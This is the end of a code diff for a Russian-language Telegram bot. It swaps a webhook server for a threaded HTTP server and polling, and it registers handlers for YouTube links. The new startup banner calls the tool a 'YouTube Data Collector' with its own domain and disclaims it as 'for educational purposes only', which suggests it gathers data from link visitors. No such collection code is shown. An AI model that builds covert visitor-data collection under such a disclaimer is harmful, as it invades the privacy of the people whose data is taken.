-        return jsonify({'status': 'success'})
-        
-    except Exception as e:
-        logger.error(f"Ошибка вебхука: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@webhook_app.route('/health')
-def health():
-    return jsonify({'status': 'healthy', 'service': 'Bot Webhook'})
-
-def run_webhook_server():
-    """Запуск вебхук сервера"""
-    logger.info("Запуск вебхук сервера на порту 8080")
-    webhook_app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
-
-# ========== ОСНОВНАЯ ФУНКЦИЯ ==========
-async def main_async():
-    """Асинхронный запуск бота"""
-    # Создаем приложение
-    app = Application.builder().token(BOT_TOKEN).build()
+def main():
+    """Основная функция запуска"""
+    global bot_loop
+    
+    # Запускаем HTTP сервер в отдельном потоке
+    server_thread = threading.Thread(target=run_server, daemon=True)
+    server_thread.start()
+    
+    logger.info("Starting HTTP server...")
+    
+    # Даем серверу время на запуск
+    import time
+    time.sleep(2)
+    
+    # Создаем event loop для асинхронных операций
+    bot_loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(bot_loop)
+    
+    # Создаем приложение бота
+    application = Application.builder().token(BOT_TOKEN).build()
     
     # Регистрируем обработчики
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("stats", lambda u, c: button_handler(u, c)))
-    
-    # Обработчик YouTube ссылок
-    app.add_handler(MessageHandler(
+    application.add_handler(CommandHandler("start", start_command))
+    application.add_handler(MessageHandler(
         filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
         handle_youtube_link
     ))
-    
-    # Обработчик кнопок
-    app.add_handler(CallbackQueryHandler(button_handler))
+    application.add_handler(CallbackQueryHandler(button_handler))
+    application.add_error_handler(error_handler)
     
     # Запускаем бота
+    logger.info("Starting Telegram bot...")
     print(f"""
-    {'='*50}
-    🤖 YouTube Bot запущен!
-    👤 Админ: {ADMIN_ID}
-    💾 БД: {len(db.links)} ссылок
-    ⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-    {'='*50}
-    Ожидание команд...
+╔══════════════════════════════════════╗
+║   🎯 YouTube Data Collector v2.0    ║
+╠══════════════════════════════════════╣
+║ ✅ Telegram Bot: Активен            ║
+║ ✅ HTTP Server: {LOCAL_HOST}:{LOCAL_PORT} ║
+║ ✅ Admin ID: {ADMIN_ID}             ║
+║ ✅ Domain: {DOMAIN}                 ║
+╚══════════════════════════════════════╝
+
+📢 Бот запущен! Используйте /start для начала.
+🌐 Локальный сервер доступен по адресу:
+   http://{LOCAL_HOST}:{LOCAL_PORT}/
+⚠️  Только для образовательных целей!
     """)
     
-    await app.run_polling()
-
-def main():
-    """Главная функция"""
-    import threading
-    import asyncio
-    
-    # Запускаем вебхук сервер в отдельном потоке
-    webhook_thread = threading.Thread(target=run_webhook_server, daemon=True)
-    webhook_thread.start()
-    
-    # Запускаем бота
-    asyncio.run(main_async())
+    application.run_polling()
 
 if __name__ == '__main__':
     main()
